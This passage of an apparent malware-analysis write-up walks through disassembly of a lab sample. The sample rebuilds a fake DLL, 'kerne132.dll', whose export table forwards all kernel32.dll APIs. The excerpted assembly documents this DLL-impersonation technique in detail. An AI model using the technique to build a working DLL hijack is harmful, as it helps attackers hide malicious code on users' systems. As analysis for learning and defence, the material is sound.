+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004015C2</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">edx</span> <span class="p">:</span> <span class="nb">si</span><span class="nv">ze</span> <span class="nv">of</span> <span class="nv">export</span> <span class="nb">di</span><span class="nv">rectory</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015C7</span>    <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span> <span class="c1">; how many last bytes</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015CE</span>    <span class="nv">rep</span> <span class="nv">movsb</span> <span class="c1">; copy</span>
+</code></pre></div></div>
+
+<p>The magic happens thanks to the instruction <em>and ecx, 3</em>. Below is the <strong>AND</strong> truth table:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: right"><strong>AND</strong></th>
+      <th><strong>0</strong></th>
+      <th><strong>1</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right"><strong>0</strong></td>
+      <td>0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>1</strong></td>
+      <td>0</td>
+      <td>1</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hence, no mater the value of <em>ecx</em> (number of bytes to copy), the <em>and ecx, 3</em> set all bits to 0 excepting the last two least significant ones:</p>
+<ul>
+  <li>00000000000000000000000000000000 &amp; 3 = 0 byte (nothing to copy)</li>
+  <li>00000000000000000000000000000001 &amp; 3 = 1 byte to copy</li>
+  <li>00000000000000000000000000000010 &amp; 3 = 2 bytes to copy</li>
+  <li>00000000000000000000000000000011 &amp; 3 = 3 bytes to copy</li>
+</ul>
+
+<h5 id="upd_export_dir_1">Updating fields of the IMAGE_EXPORT_DIRECTORY (1)</h5>
+
+<p>In the code below, both <strong>NumberOfFunctions</strong> and <strong>NumberOfNames</strong> are copied from <em>kernel32.dll</em> to <em>Lab01-01.dll</em>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebx-&gt;Export directory of kernel32.dll</span>
+<span class="c1">; ebp-&gt;Export directory of malicious dll</span>
+<span class="err">0</span><span class="nf">x004015D0</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mh">14h</span><span class="p">]</span>  <span class="c1">; NbOfFunctions (k32)</span>
+<span class="err">0</span><span class="nf">x004015D3</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">14h</span><span class="p">],</span> <span class="nb">ecx</span>  <span class="c1">; update NumberOfFunctions</span>
+<span class="err">0</span><span class="nf">x004015D6</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mh">18h</span><span class="p">]</span>  <span class="c1">; NumberOfNames (K32)</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015DC</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">18h</span><span class="p">],</span> <span class="nb">edx</span>  <span class="c1">; update NumberOfNames </span>
+</code></pre></div></div>
+
+<p>Then comes the baptism of the malicious DLL: the string <em>kerne123.dll</em> is written just after its export directory with several <em>mov</em> (note the number “1” instead of the lowercase “l”) :</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;Export directory of malicious dll</span>
+<span class="err">0</span><span class="nf">x004015D9</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">28h</span><span class="p">]</span>  <span class="c1">; end of export directory</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015E8</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">fakename</span> <span class="c1">; "kerne132.dll"</span>
+<span class="err">0</span><span class="nf">x004015EE</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015F7</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">edx</span><span class="p">],</span> <span class="nb">esi</span>
+<span class="err">0</span><span class="nf">x004015F9</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">fakename</span><span class="o">+</span><span class="mi">4</span> <span class="c1">; "e132.dll"</span>
+<span class="err">0</span><span class="nf">x004015FF</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">esi</span>
+<span class="err">0</span><span class="nf">x00401602</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">fakename</span><span class="o">+</span><span class="mi">8</span> <span class="c1">; ".dll"</span>
+<span class="err">0</span><span class="nf">x00401608</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">esi</span>
+<span class="err">0</span><span class="nf">x0040160B</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">fakename</span><span class="o">+</span><span class="mh">0Ch</span> <span class="c1">; ""</span>
+<span class="err">0</span><span class="nf">x00401611</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mh">0Ch</span><span class="p">],</span> <span class="nb">esi</span>
+</code></pre></div></div>
+
+<p>The field <strong>NameRVA</strong> has to be updated so the RVA will indicate the new name. Recall the rabbit hole where RVAs were converted to mapped addresses? Well, we have to go the other way now: the mapped address pointing to the string <em>“kerne123.dll”</em> (new name of the malicious DLL) is converted to an RVA. 
+The function we are interested in is called at address <em>0x4015B0</em>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; esi-&gt;NtHeaders</span>
+<span class="err">0</span><span class="nf">x004015AA</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">78h</span><span class="p">]</span>  <span class="c1">; Exp. directory RVA (malicious)</span>
+<span class="err">0</span><span class="nf">x004015AD</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; baseMappedView</span>
+<span class="err">0</span><span class="nf">x004015AE</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; malicious-&gt;NtHeaders</span>
+<span class="err">0</span><span class="nf">x004015AF</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; RVA</span>
+<span class="err">0</span><span class="nf">x004015B0</span>    <span class="nv">call</span>    <span class="nv">ComputeMagicDelta</span>
+</code></pre></div></div>
+<p>The magic delta computed will be used to convert any mapped address to a RVA. The way it has been implemented perplexes me, but it does the job. <a href="#upd_export_dir_2">Skip another rabbit hole</a>.</p>
+
+<h5 id="rabbit-hole-converting-a-mapped-address-to-a-rva">Rabbit hole: converting a mapped address to a RVA</h5>
+
+<p>Instinctively, I was expecting a similar approach to what we have seen in the first rabbit hole (<a href="https://forum.exetools.com/showpost.php?p=29653&amp;postcount=2">see there</a> for example). In this malware, however, author(s) have opted for a kind of “magic delta”. I guess Forrest Gump’s mom would have had something to say about that.</p>
+
+<p>Note the function <em>ComputeMagicDelta()</em> has the same prototype as the function <a href="#rebuild_export_dir"><em>RVA2MappedAddress()</em></a> seen previously. Digging into the function <em>ComputeMagicDelta()</em>, we see that:</p>
+<ol>
+  <li>A pointer to the <strong>_IMAGE_SECTION_HEADER</strong> of the section containing the <strong>IMAGE_EXPORT_DIRECTORY</strong> is retrieved:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401070</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">pNtHeaders</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401074</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">RVA</span><span class="p">]</span> <span class="c1">; exp. directory (malicious)</span>
+<span class="err">0</span><span class="nf">x00401078</span>    <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x00401079</span>    <span class="nv">push</span>    <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x0040107A</span>    <span class="nv">call</span>    <span class="nv">LocateHeaderOfSectionContainingRVA</span>
+<span class="err">0</span><span class="nf">x0040107F</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The delta between the RVA of the section and the raw offset of the section is computed:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ecx-&gt;_IMAGE_SECTION_HEADER</span>
+<span class="err">0</span><span class="nf">x00401089</span> <span class="nv">loc_401089</span><span class="p">:</span>
+<span class="err">0</span><span class="nf">x00401089</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">0Ch</span><span class="p">]</span>  <span class="c1">; section VirtualAddress</span>
+<span class="err">0</span><span class="nf">x0040108C</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">14h</span><span class="p">]</span>  <span class="c1">; section PointerToRawData</span>
+<span class="err">0</span><span class="nf">x0040108F</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">baseMappedView</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401093</span>    <span class="nv">sub</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; vaddr - raddr</span>
+<span class="err">0</span><span class="nf">x00401095</span>    <span class="nv">sub</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; (vaddr - raddr) - base</span>
+<span class="err">0</span><span class="nf">x00401097</span>    <span class="nv">retn</span>
+</code></pre></div>    </div>
+    <p>Note the base address of the mapped view is also substracted. The resulting value will be used later to convert any mapped address (as long as it points within the section containing the export table) to an RVA.</p>
+  </li>
+</ol>
+
+<h5 id="upd_export_dir_2">Updating fields of the IMAGE_EXPORT_DIRECTORY (2)</h5>
+
+<p>Now we have the magic delta to convert mapped addresses to RVAs, we can update the <strong>NameRVA</strong>, <strong>AddressOfFunctions</strong>, <strong>AddressOfNames</strong> and <strong>AddressOfNameOrdinals</strong> fields. <br />
+The code below shows how the field <strong>NameRVA</strong> is updated:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;Export directory of malicious dll</span>
+<span class="c1">; eax = magic delta</span>
+<span class="err">0</span><span class="nf">x004015D9</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">28h</span><span class="p">]</span>  <span class="c1">; ebx-&gt;"kerne123.dll"</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015E2</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">eax</span><span class="p">]</span>  <span class="c1">; convert to RVA</span>
+<span class="err">0</span><span class="nf">x004015E5</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0Ch</span><span class="p">],</span> <span class="nb">edx</span>  <span class="c1">; update field</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004015F0</span>    <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="mh">10h</span>        <span class="c1">; -&gt;end of string + dw align.</span>
+</code></pre></div></div>
+<p>The <em>add ebx, 10h</em> instruction allows having <em>ebx</em> pointing after the string <em>kerne132.dll</em> (plus some padding to be dword-aligned). Half-spoil, let’s call the address pointed by <em>ebx</em> “<em>array1</em>”. <br />
+Two other addresses are computed, let’s call them “<em>array2</em>” and “<em>array3</em>”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;malicious export directory</span>
+<span class="c1">; ebx-&gt;array1</span>
+<span class="err">0</span><span class="nf">x00401614</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">14h</span><span class="p">]</span>  <span class="c1">; NumberOfFuntion</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401617</span>    <span class="nv">lea</span>     <span class="nb">esi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="c1">; -&gt;array2</span>
+<span class="err">0</span><span class="nf">x0040161A</span>    <span class="nv">lea</span>     <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span> <span class="c1">; -&gt;array3</span>
+<span class="err">0</span><span class="nf">x0040161D</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">array2</span><span class="p">],</span> <span class="nb">esi</span> <span class="c1">; </span>
+<span class="err">0</span><span class="nf">x00401621</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">array3</span><span class="p">],</span> <span class="nb">edi</span> <span class="c1">; </span>
+</code></pre></div></div>
+<p>Next, the magic delta is applied to <em>array1</em>, <em>array2</em> and <em>array3</em>; their purpose appears in the following snippet:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;malicious export directory</span>
+<span class="c1">; eax = magic delta</span>
+<span class="c1">; ebx-&gt;array1</span>
+<span class="c1">; ecx = NumberOfFunctions</span>
+<span class="c1">; edi-&gt;array3</span>
+<span class="c1">; esi-&gt;array2</span>
+<span class="err">0</span><span class="nf">x004015DF</span>    <span class="nv">shl</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span> <span class="c1">; NbOfFunction*16</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401625</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">eax</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401628</span>    <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; -&gt;array4</span>
+<span class="err">0</span><span class="nf">x0040162A</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">1Ch</span><span class="p">],</span> <span class="nb">edx</span>  <span class="c1">; AddrofFunctions RVA</span>
+<span class="err">0</span><span class="nf">x0040162D</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">eax</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401630</span>    <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">edi</span>
+<span class="err">0</span><span class="nf">x00401632</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">24h</span><span class="p">],</span> <span class="nb">edx</span>  <span class="c1">; AddrofNameOrdinals RVA</span>
+<span class="err">0</span><span class="nf">x00401635</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">20h</span><span class="p">],</span> <span class="nb">eax</span>  <span class="c1">; AddrofNames RVA</span>
+</code></pre></div></div>
+<p>And suddently, it becomes clear:</p>
+<ul>
+  <li>array1 = malicious ExportAddressTable</li>
+  <li>array2 = malicious ExportOrdinalTable</li>
+  <li>array3 = malicious ExportNamePointerTable</li>
+</ul>
+
+<p>For a refreasher, have a look at my <a href="/cheatsheets/pe/#export_table"><strong>export table</strong> cheatsheet</a>.<br />
+The code above also shows a fourth array (“<em>array4</em>”) pointing to <em>array1 + (NbOfFunctions*16)</em> is computed. This is the future <strong>ExportNameTable</strong>, an array of strings that will contain a copy of all API names exported by <em>kernel32.dll</em>.<br />
+At this point, the <strong>IMAGE_EXPORT_DIRECTORY</strong> of the malicious DLL is rebuilt. Now is time to rebuild the <strong>ExportAddressTable</strong>, <strong>ExportOrdinalTable</strong>, <strong>ExportNamePointerTable</strong>, and <strong>ExportNameTable</strong>.</p>
+
+<h4 id="rebuild_eat_enpt_eot_ent">Rebuild the EAT, ENPT, EOT, and ENT</h4>
+
+<p>An new call to <em>RVA2MappedAddress()</em> occurs at address <em>0x4016c1</em>. This call retrieves a pointer to the first API name exported by <em>kernel32.dll</em>; then, the length of the string is computed thanks to the instruction <a href="https://c9x.me/x86/html/file_module_x86_id_287.html"><em>repne scasb</em></a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004016C1</span>   <span class="nv">call</span>    <span class="nv">RVA2MappedAddress</span>
+<span class="err">0</span><span class="nf">x004016C6</span>   <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; -&gt;API name</span>
+<span class="err">0</span><span class="nf">x004016C8</span>   <span class="nv">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFFFFFFh</span> <span class="c1">; repne will decrease ecx</span>
+<span class="err">0</span><span class="nf">x004016CB</span>   <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; -&gt;string (API name)</span>
+<span class="err">0</span><span class="nf">x004016CD</span>   <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; value looked for</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004016D4</span>   <span class="nv">repne</span> <span class="nv">scasb</span>             <span class="c1">; scan while \x00 not found</span>
+<span class="err">0</span><span class="nf">x004016D6</span>   <span class="nv">not</span>     <span class="nb">ecx</span>             <span class="c1">; length (incl. \x00)</span>
+<span class="err">0</span><span class="nf">x004016D8</span>   <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span>
+</code></pre></div></div>
+
+<p>Once the length of the API name is known, it is copied into the <strong>ExportNameTable</strong> (called “<em>array4</em>” in the <a href="#upd_export_dir_2">previous section</a>) of the malicious DLL:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; esi-&gt;API name in kernel32.dll</span>
+<span class="c1">; ecx = string length</span>
+<span class="c1">; ebx-&gt;ExportNameTable (API name) in malicious DLL</span>
+<span class="err">0</span><span class="nf">x004016D8</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x004016DA</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span> 
+<span class="err">0</span><span class="nf">x004016DC</span>    <span class="nv">shr</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; length/4 because movsd</span>
+<span class="err">0</span><span class="nf">x004016DF</span>    <span class="nv">rep</span> <span class="nv">movsd</span> 
+<span class="err">0</span><span class="nf">x004016E1</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004016E7</span>    <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>          <span class="c1">; copy remaining</span>
+<span class="err">0</span><span class="nf">x004016EA</span>    <span class="nv">rep</span> <span class="nv">movsb</span>
+</code></pre></div></div>
+<p>The use of <em>and ecx, 3</em> followed by <em>rep movsb</em> has been explained <a href="#copy_export_dir">previously</a>.<br />
+Now the first API name (i.e. first entry of the <strong>ExportNameTable</strong>) has been copied, it’s corresponding RVA has to be set in the <strong>ExportNamePointerTable</strong>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;ExportAddressTable</span>
+<span class="c1">; eax = size of ExportAddressTable</span>
+<span class="c1">; ebx-&gt;ExportNameTable (copied API name)</span>
+<span class="c1">; esi = magic delta</span>
+<span class="err">0</span><span class="nf">x004016FC</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">esi</span><span class="p">]</span>  <span class="c1">; RVA of API name</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401701</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="nb">ebp</span><span class="p">],</span> <span class="nb">ecx</span>  <span class="c1">; -&gt;EAT+sizeof(EAT) = -&gt;ENPT</span>
+</code></pre></div></div>
+<p>from the snipped above we can also say that the <strong>ExportNamePointerTable</strong> is found right after the <strong>ExportAddressTable</strong>.<br />
+Once the first entry of the <strong>ExportNamePointerTable</strong> is good, the first entry of the <strong>ExportOrdinalTable</strong> is set:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004016E3</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">EOT</span><span class="p">]</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004016EC</span>    <span class="nv">mov</span>     <span class="nb">cx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">counter</span><span class="p">]</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004016F5</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="nb">cx</span>       <span class="c1">; new NameOrdinal</span>
+</code></pre></div></div>
+
+<p>Last but not least, the <strong>ExportAddressTable</strong> is updated. What happens here is the setup of <strong>export forwarding</strong>: where we may expect to find the RVA of the first API address, we will instead have the RVA of a string matching the pattern “<em>kernel32.apiname</em>”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebx-&gt;ExportNameTable (copied API name)</span>
+<span class="c1">; ecx=string length (without '\x00')</span>
+<span class="c1">; esi = magic delta</span>
+<span class="err">0</span><span class="nf">x00401710</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="c1">; -&gt;end of apiname+1 (\x00)</span>
+<span class="err">0</span><span class="nf">x00401714</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>         <span class="c1">; eax-&gt;start of new string</span>
+<span class="err">0</span><span class="nf">x00401716</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="nb">esi</span><span class="p">]</span>   <span class="c1">; ecx = RVA of new string</span>
+<span class="err">0</span><span class="nf">x00401719</span>    <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="mi">9</span>           <span class="c1">; ebx+=len("kernel32.")</span>
+<span class="err">0</span><span class="nf">x0040171C</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mi">0</span><span class="p">],</span> <span class="nb">ecx</span>     <span class="c1">; update EAT</span>
+<span class="err">0</span><span class="nf">x0040171F</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">aKernel32</span> <span class="c1">; write "Kern"</span>
+<span class="err">0</span><span class="nf">x00401725</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x00401727</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="nv">aKernel32</span><span class="o">+</span><span class="mi">4</span> <span class="c1">; write "el32"</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040172F</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x00401732</span>    <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="nv">aKernel32</span><span class="o">+</span><span class="mi">8</span> <span class="c1">; write "."</span>
+<span class="err">0</span><span class="nf">x00401738</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">cl</span> <span class="c1">; 'Kernel32.'</span>
+</code></pre></div></div>
+<p>At this point, the first entry of the <strong>ExportAddressTable</strong> is the RVA of the string “<em>Kernel32.</em>”. The last step is to write the name of the API right after this string:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; edi-&gt;API name (in kernel32.dll)</span>
+<span class="c1">; esi-&gt;API name (in kernel32.dll)</span>
+<span class="c1">; ebx-&gt;empty space (just after the string "kernel32.")</span>
+<span class="err">0</span><span class="nf">x0040173B</span>    <span class="nv">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFFFFFFh</span>
+<span class="err">0</span><span class="nf">x0040173E</span>    <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x00401740</span>    <span class="nv">repne</span> <span class="nv">scasb</span>
+<span class="err">0</span><span class="nf">x00401742</span>    <span class="nv">not</span>     <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x00401744</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span> <span class="c1">; API name length</span>
+<span class="err">0</span><span class="nf">x00401746</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span> <span class="c1">; -&gt;after "kernel32."</span>
+<span class="err">0</span><span class="nf">x00401748</span>    <span class="nv">shr</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; copy dwords</span>
+<span class="err">0</span><span class="nf">x0040174B</span>    <span class="nv">rep</span> <span class="nv">movsd</span>
+<span class="err">0</span><span class="nf">x0040174D</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span> <span class="c1">; API name length</span>
+<span class="err">0</span><span class="nf">x0040174F</span>    <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x00401751</span>    <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>   <span class="c1">; copy remaining bytes</span>
+<span class="err">0</span><span class="nf">x00401754</span>    <span class="nv">rep</span> <span class="nv">movsb</span>
+</code></pre></div></div>
+<p>All the <em>rep*</em>-based shenanigans have been explained in previous sections. After that, the different counters and pointers are updated, and the next API is processed (code not shown). <br />
+So, we finally have the first entry of the <strong>ExportAddressTable</strong> being the RVA of a string following the pattern “<em>Kernel32.apiname</em>”. This, plus the fact that the RVA relates to an address inside the export table (and not within the code section) indicates <strong>export forwarding</strong>. That is, the export table of the malicious DLL has been rebuilt to forward all calls made to it to the legitimate <em>kernel32.dll</em>. But, what would make a given binary to call an API from the malicious DLL ? This is what we’ll see in the next section.</p>
+
+<h3 id="filesystem_alteration">Alteration of the filesystem</h3>
+
+<h4 id="dropping-the-malicious-dll-on-disk">Dropping the malicious DLL on disk</h4>
+
